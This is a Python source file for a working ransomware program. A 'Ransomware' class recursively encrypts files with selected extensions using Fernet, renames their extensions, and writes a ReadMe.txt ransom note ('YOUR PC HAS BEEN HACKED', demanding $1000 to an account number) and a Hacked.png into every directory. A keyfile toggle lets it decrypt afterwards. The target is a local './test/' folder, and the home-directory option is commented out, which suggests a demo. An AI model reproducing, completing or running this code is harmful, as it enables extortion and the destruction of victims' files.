import os
import sys
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
import shutil

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

class Ransomware:

    def __init__(self, key=None):
        self.cryptor = None
        self.file_ext_targets = ['txt','png','pdf','exe','zip','rar','jni','pok','etf','uhg','thu','jpg','pjp']


    def generate_key(self):
        
        #RNDOM KEY GENERATOR USING FERNET

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    
    def read_key(self, keyfile_name):
        #get key when decrypting
        with open(keyfile_name, 'rb') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)


    def write_key(self, keyfile_name):
        #store key to use for decryption
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)
    

    def crypt_root(self, root_dir, encrypted=False):
        
        #Browse every folder recurvisely and each file with the mentioned extension
        #warning msg
        banner="""                                                                                       
88        88         db         ,ad8888ba,   88      a8P   88888888888  88888888ba,    
88        88        d88b       d8''    `'8b  88    ,88'    88           88      `'8b   
88        88       d8'`8b     d8'            88  ,88'      88           88        `8b  
88aaaaaaaa88      d8'  `8b    88             88,d88'       88aaaaa      88         88  
88aaaaaaaa88     d8YaaaaY8b   88             8888'88,      88'''''      88         88  
88        88    d8aaaaaaaa8b  Y8,            88P   Y8b     88           88         8P  
88        88   d8'        `8b  Y8a.    .a8P  88     '88,   88           88      .a8P   
88        88  d8'          `8b  `'Y8888Y''   88       Y8b  88888888888  88888888Y''   """
        message="\nYOUR PC HAS BEEN HACKED\nIF YOU WANT TO GAIN CONTROL\nTRANSFER THE $1000 TO BELOW ACCOUNT NUMBER\n315185351213"
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue
                #cleaning up readme and hacked.png
                elif (f.split('.')[-1]=="txt" or f.split('.')[-1]=="png") and encrypted:
                    os.remove(abs_file_path)
                    continue
                #sending file to encrypt/decrypt
                self.crypt_file(abs_file_path, encrypted=encrypted)
        if not encrypted:
            #creating readme and hacked.png in each directory
            for root, _, files in os.walk(root_dir):
                shutil.copy(resource_path('Hacked.png'),root)
                with open(os.path.join(root,'ReadMe.txt'),'w') as f:
                    f.write(banner)
                    f.write(message)


    def crypt_file(self, file_path, encrypted=False):
        
        #encrypt/decrypt the data 
        change_ext={"txt":"jni","rar":"pok","pdf":"eft","png":"uhg","zip":"thu","jni":"txt","pok":"rar","eft":"pdf","uhg":"png","thu":"zip","jpg":"pjp","pjp":"jpg"}
        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                data = self.cryptor.encrypt(_data)
            else:
                data = self.cryptor.decrypt(_data)
            f.truncate(0)
            f.seek(0)
            f.write(data)
        #change the extension
        name,ext=file_path[:-3],file_path[-3:]
        os.rename(file_path,name+change_ext[ext])

if __name__ == '__main__':
    # sys_root = expanduser('~')
    local_root = './test/'

    Ransom = Ransomware()
    flag=False
    '''Ransom.generate_key()
    Ransom.write_key('keyfile')
    Ransom.crypt_root(local_root)'''
    with open("keyfile",'a+') as f:
        f.seek(0)
        read=f.read()
        if read=="":
            print('Encrypting')
            Ransom.generate_key()
            Ransom.write_key('keyfile')
            Ransom.crypt_root(local_root)
        else:
            flag=True
            print("Decrypting")
            Ransom.read_key('keyfile')
            Ransom.crypt_root(local_root, encrypted=True)
    if flag:
        os.remove("keyfile")
    '''if sys.argv[1] == 'decrypt':
        with open("keyfile",'a+') as f:
            f.seek(0)
            read=f.read()
            if read=="":
                print('KeyFile is empty')
            else:
                Ransom.read_key('keyfile')
                Ransom.crypt_root(local_root, encrypted=True)
        os.remove("keyfile")
    elif sys.argv[1] == '':
        Ransom.generate_key()
        Ransom.write_key('keyfile')
        Ransom.crypt_root(local_root)'''